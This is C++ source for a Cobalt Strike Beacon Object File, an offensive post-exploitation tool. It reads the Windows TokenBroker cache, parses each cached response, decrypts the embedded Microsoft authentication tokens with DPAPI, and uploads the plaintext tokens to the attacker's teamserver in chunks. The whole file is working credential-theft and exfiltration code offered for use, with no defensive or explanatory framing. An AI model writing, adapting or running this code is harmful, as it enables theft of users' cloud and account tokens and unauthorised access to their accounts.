#include <Windows.h>
#include "base\helpers.h"
#include <shlobj_core.h>
#include <shlwapi.h>
#include <dpapi.h>
#include <fileapi.h>
#include <string.h>
#include <heapapi.h>
#include <handleapi.h>
#include <stdio.h>
#include <time.h>

extern "C" {
#include "beacon.h"

	#define TARGET_PARENT "\"ResponseBytes\""
	#define TARGET_KEY "\"Value\":\""

	#define CALLBACK_FILE 0x02
	#define CALLBACK_FILE_WRITE 0x08
	#define CALLBACK_FILE_CLOSE 0x09
	#define CHUNK_SIZE 0xe1000

		
	DFR(CRYPT32, CryptStringToBinaryA);
	#define CryptStringToBinaryA CRYPT32$CryptStringToBinaryA

	DFR(CRYPT32, CryptUnprotectData);
	#define CryptUnprotectData  CRYPT32$CryptUnprotectData 

	DFR(SHELL32, SHGetFolderPathA);
	#define SHGetFolderPathA SHELL32$SHGetFolderPathA

	DFR(SHLWAPI, PathAppendA);
	#define PathAppendA SHLWAPI$PathAppendA

	DFR(KERNEL32, FindFirstFileA);
	#define FindFirstFileA KERNEL32$FindFirstFileA

	DFR(KERNEL32, WideCharToMultiByte);
	#define WideCharToMultiByte KERNEL32$WideCharToMultiByte

	DFR(KERNEL32, FindNextFileA);
	#define FindNextFileA KERNEL32$FindNextFileA

	DFR(KERNEL32, LocalFree);
	#define LocalFree KERNEL32$LocalFree

	DFR(KERNEL32, FindClose);
	#define FindClose KERNEL32$FindClose

	DFR(KERNEL32, HeapAlloc);
	#define HeapAlloc KERNEL32$HeapAlloc

	DFR(KERNEL32, GetProcessHeap);
	#define GetProcessHeap KERNEL32$GetProcessHeap

	DFR(KERNEL32, HeapFree);
	#define HeapFree KERNEL32$HeapFree

	DFR(KERNEL32, GetFileSize);
	#define GetFileSize KERNEL32$GetFileSize

	DFR(KERNEL32, ReadFile);
	#define ReadFile KERNEL32$ReadFile

	DFR(KERNEL32, CreateFileA);
	#define CreateFileA KERNEL32$CreateFileA

	DFR(KERNEL32, CloseHandle);
	#define CloseHandle KERNEL32$CloseHandle

	DFR(MSVCRT, strcmp);
	#define strcmp MSVCRT$strcmp

	DFR(MSVCRT, strnlen);
	#define strnlen MSVCRT$strnlen

	DFR(MSVCRT, time);
	#define time MSVCRT$time

	DFR(MSVCRT, rand);
	#define rand MSVCRT$rand

	DFR(MSVCRT, srand);
	#define srand MSVCRT$srand

	DFR(MSVCRT, strcpy);
	#define strcpy MSVCRT$strcpy

	DFR(MSVCRT, strlen);
	#define strlen MSVCRT$strlen

	DFR(MSVCRT, strcat);
	#define strcat MSVCRT$strcat

	DFR(SHLWAPI, StrStrA);
	#define StrStrA SHLWAPI$StrStrA

	DFR(MSVCRT, memcpy);
	#define memcpy MSVCRT$memcpy

	DFR(USER32, CharNextA);
	#define CharNextA USER32$CharNextA


	BOOL unprotectDataDPAPI(BYTE* encryptedData, DWORD encryptedDataLen, BYTE** decryptedData, DWORD* decryptedDataLen) {
		DATA_BLOB inBlob;
		DATA_BLOB outBlob;

		inBlob.pbData = encryptedData;
		inBlob.cbData = encryptedDataLen;

		// Decrypt using current user's context
		if (!CryptUnprotectData(&inBlob, NULL, NULL, NULL, NULL, 0, &outBlob)) {
			;
			BeaconPrintf(CALLBACK_ERROR, "CryptUnprotectData failed");
			return FALSE;
		}

		*decryptedData = outBlob.pbData;
		*decryptedDataLen = outBlob.cbData;
		return TRUE;
	}

	char* utf16ToUTF8(wchar_t* buffer) {

		int neededSize = WideCharToMultiByte(CP_UTF8, 0, buffer, -1, NULL, 0, NULL, NULL);
		char* utf8Buffer = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, neededSize);
		WideCharToMultiByte(CP_UTF8, 0, buffer, -1, utf8Buffer, neededSize, NULL, NULL);

		return utf8Buffer;

	}

	char* findValue(const char* start, const char* key) {
		const char* keyPos = StrStrA(start, key);
		if (!keyPos) return nullptr;

		const char* valueStart = keyPos + strlen(key);
		const char* valueEnd = CharNextA(valueStart);
		while (valueEnd && *valueEnd != '"') {
			valueEnd = CharNextA(valueEnd);
		}
		if (!valueEnd) return nullptr;

		size_t len = valueEnd - valueStart;

		char* buffer = (char*)HeapAlloc(GetProcessHeap(), 0, len + 1);
		if (!buffer) return nullptr;

		memcpy(buffer, valueStart, len);
		buffer[len] = '\0';

		return buffer;
	}

	BOOL base64DecodeCryptoAPI(const char* base64Input, BYTE** outputBuffer, DWORD* outputLength) {
		DWORD dwSize = 0;

		if (!CryptStringToBinaryA(base64Input, 0, CRYPT_STRING_BASE64, NULL, &dwSize, NULL, NULL)) {
			BeaconPrintf(CALLBACK_ERROR, "Error getting decode size");
			return FALSE;
		}

		BYTE* buffer = (BYTE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize + 1);
		if (!buffer) {
			BeaconPrintf(CALLBACK_ERROR, "Memory allocation failed\n");
			return FALSE;
		}

		if (!CryptStringToBinaryA(base64Input, 0, CRYPT_STRING_BASE64, buffer, &dwSize, NULL, NULL)) {
			BeaconPrintf(CALLBACK_ERROR, "Base64 decode failed");
			HeapFree(GetProcessHeap(), 0, buffer);
			return FALSE;
		}

		buffer[dwSize] = '\0';
		*outputBuffer = buffer;
		*outputLength = dwSize;
		return TRUE;
	}

	//https://github.com/SpecterOps/Nemesis/blob/6138d98cee30446f89c230904bba5c1b54a55fe2/cmd/connectors/cobaltstrike-nemesis-connector/bof_reg_collect/common/upload_file.c#L4
	BOOL downloadFile(LPCSTR fileName, char fileData[], ULONG32 fileLength) {
		int fileNameLength = strnlen(fileName, 256);

		// intializes the random number generator
		time_t t;
		srand((unsigned)time(&t));

		// generate a 4 byte random id, rand max value is 0x7fff
		ULONG32 fileId = 0;
		fileId |= (rand() & 0x7FFF) << 0x11;
		fileId |= (rand() & 0x7FFF) << 0x02;
		fileId |= (rand() & 0x0003) << 0x00;

		// 8 bytes for fileId and fileLength
		int messageLength = 8 + fileNameLength;
		char* packedData = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, messageLength);
		if (!packedData) {
			BeaconPrintf(CALLBACK_ERROR, "Could not download the dump");
			return FALSE;
		}

		// pack on fileId as 4-byte int first
		packedData[0] = (fileId >> 0x18) & 0xFF;
		packedData[1] = (fileId >> 0x10) & 0xFF;
		packedData[2] = (fileId >> 0x08) & 0xFF;
		packedData[3] = (fileId >> 0x00) & 0xFF;

		// pack on fileLength as 4-byte int second
		packedData[4] = (fileLength >> 0x18) & 0xFF;
		packedData[5] = (fileLength >> 0x10) & 0xFF;
		packedData[6] = (fileLength >> 0x08) & 0xFF;
		packedData[7] = (fileLength >> 0x00) & 0xFF;

		// pack on the file name last
		for (int i = 0; i < fileNameLength; i++) {
			packedData[8 + i] = fileName[i];
		}

		// tell the teamserver that we want to download a file
		BeaconOutput(CALLBACK_FILE, packedData, messageLength);
		HeapFree(GetProcessHeap(), 0, packedData);
		packedData = NULL;

		// we use the same memory region for all chunks
		int chunkLength = 4 + CHUNK_SIZE;
		char* packedChunk = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, chunkLength);
		if (!packedChunk) {
			BeaconPrintf(CALLBACK_ERROR, "Could not download the dump");
			return FALSE;
		}
		// the fileId is the same for all chunks
		packedChunk[0] = (fileId >> 0x18) & 0xFF;
		packedChunk[1] = (fileId >> 0x10) & 0xFF;
		packedChunk[2] = (fileId >> 0x08) & 0xFF;
		packedChunk[3] = (fileId >> 0x00) & 0xFF;

		ULONG32 exfiltrated = 0;
		while (exfiltrated < fileLength) {
			// send the file content by chunks
			chunkLength = fileLength - exfiltrated > CHUNK_SIZE
				? CHUNK_SIZE
				: fileLength - exfiltrated;
			ULONG32 chunkIndex = 4;
			for (ULONG32 i = exfiltrated; i < exfiltrated + chunkLength; i++) {
				packedChunk[chunkIndex++] = fileData[i];
			}
			// send a chunk
			BeaconOutput(CALLBACK_FILE_WRITE, packedChunk, 4 + chunkLength);
			exfiltrated += chunkLength;
		}
		HeapFree(GetProcessHeap(), 0, packedChunk);
		packedChunk = NULL;

		// tell the teamserver that we are done writing to this fileId
		char packedClose[4];
		packedClose[0] = (fileId >> 0x18) & 0xFF;
		packedClose[1] = (fileId >> 0x10) & 0xFF;
		packedClose[2] = (fileId >> 0x08) & 0xFF;
		packedClose[3] = (fileId >> 0x00) & 0xFF;
		BeaconOutput(CALLBACK_FILE_CLOSE, packedClose, 4);

		return TRUE;
	}



	void go(char* args, int len)
	{
		CHAR localappdata[MAX_PATH];
		CHAR cachePath[MAX_PATH];
		CHAR searchPath[MAX_PATH];

		SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localappdata);
		strcpy(cachePath, localappdata);
		PathAppendA(cachePath, "\\Microsoft\\TokenBroker\\Cache");
		strcpy(searchPath, cachePath);
		PathAppendA(searchPath, "*");

		//collect a list of the files
		WIN32_FIND_DATA data;
		HANDLE hFind = FindFirstFileA(searchPath, &data);
		//Max number of files for processing, feel free to change
		char* files[100];
		int fileIndex = 0;
		if (hFind != INVALID_HANDLE_VALUE) {
			do {
				if (strcmp(data.cFileName, ".") != 0 && strcmp(data.cFileName, "..") != 0) {
					if (fileIndex == 99) {
						BeaconPrintf(CALLBACK_ERROR, "Reached max number of files, skipping the rest.");
						break;
					}
					files[fileIndex] = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, strlen(data.cFileName) + 1);
					strcpy(files[fileIndex], data.cFileName);
					fileIndex++;
				}
			} while (FindNextFile(hFind, &data));
			FindClose(hFind);
			files[fileIndex] = nullptr;
		}

		//Go thourgh the files
		int counter = 0;
		while (files[counter]) {

			CHAR fullPath[MAX_PATH];
			strcpy(fullPath, cachePath);
			PathAppendA(fullPath, files[counter]);

			BeaconPrintf(CALLBACK_OUTPUT, "Decrypting blob from: %s", fullPath);

			//Read file contents
			HANDLE hFile = CreateFileA(fullPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
			if (hFile == INVALID_HANDLE_VALUE) {
				BeaconPrintf(CALLBACK_ERROR, "Failed to open file. Continuing to the next one");
				HeapFree(GetProcessHeap(), 0, files[counter]);
				counter++;
				continue;
			}
			DWORD fileSize = GetFileSize(hFile, NULL);
			if (fileSize == INVALID_FILE_SIZE) {
				BeaconPrintf(CALLBACK_ERROR, "Failed to get size of file. Continuing to the next one");
				CloseHandle(hFile);
				HeapFree(GetProcessHeap(), 0, files[counter]);
				counter++;
				continue;
			}
			char* buffer = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, fileSize + 1);
			DWORD bytesRead;

			if (!ReadFile(hFile, buffer, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
				BeaconPrintf(CALLBACK_ERROR, "Failed to read file. Continuing with the next one.");
				HeapFree(GetProcessHeap(), 0, buffer);
				HeapFree(GetProcessHeap(), 0, files[counter]);
				CloseHandle(hFile);
				counter++;
				continue;
			}

			CloseHandle(hFile);

			//Convert buffer to UTF8
			char* utf8Buffer = utf16ToUTF8((wchar_t*)buffer);

			//Get the b64 encoded + protected value holding the token
			// Look for "ResponseBytes" first 
			char* responsePtr = StrStrA(utf8Buffer, TARGET_PARENT);
			if (!responsePtr) {
				BeaconPrintf(CALLBACK_ERROR, "Parsing the file failed. Continuing with the next one.");
				HeapFree(GetProcessHeap(), 0, buffer);
				HeapFree(GetProcessHeap(), 0, utf8Buffer);
				HeapFree(GetProcessHeap(), 0, files[counter]);
				counter++;
				continue;
			}

			// Look for nested "Value"
			char* result = findValue(responsePtr, TARGET_KEY);
			if (!result) {
				BeaconPrintf(CALLBACK_ERROR, "Parsing the file failed.Continuing with the next one.");
				HeapFree(GetProcessHeap(), 0, buffer);
				HeapFree(GetProcessHeap(), 0, utf8Buffer);
				HeapFree(GetProcessHeap(), 0, files[counter]);
				counter++;
				continue;
			}

			BYTE* decoded = NULL;
			DWORD decodedLen = 0;

			if (!base64DecodeCryptoAPI(result, &decoded, &decodedLen)) {

				BeaconPrintf(CALLBACK_ERROR, "Parsing / b64 decoding failed. Continuing with the next file.");
				HeapFree(GetProcessHeap(), 0, result);
				HeapFree(GetProcessHeap(), 0, buffer);
				HeapFree(GetProcessHeap(), 0, utf8Buffer);
				HeapFree(GetProcessHeap(), 0, files[counter]);
				counter++;
				continue;
			}

			BYTE* decrypted = NULL;
			DWORD decryptedLen = 0;

			if (unprotectDataDPAPI(decoded, decodedLen, &decrypted, &decryptedLen)) {

				CHAR uploadFileName[MAX_PATH];
				strcpy(uploadFileName, files[counter]);
				strcat(uploadFileName, ".decrypted");

				//Download decrypted value to the teamserver
				downloadFile((LPCSTR)uploadFileName, (CHAR*)decrypted, decryptedLen);
			}
			else {
				BeaconPrintf(CALLBACK_ERROR, "Decryption failed. Continuing with the next file.");
			}

			LocalFree(decrypted);
			HeapFree(GetProcessHeap(), 0, buffer);
			HeapFree(GetProcessHeap(), 0, utf8Buffer);
			HeapFree(GetProcessHeap(), 0, result);
			HeapFree(GetProcessHeap(), 0, decoded);
			HeapFree(GetProcessHeap(), 0, files[counter]);

			counter++;
		}

	}
}
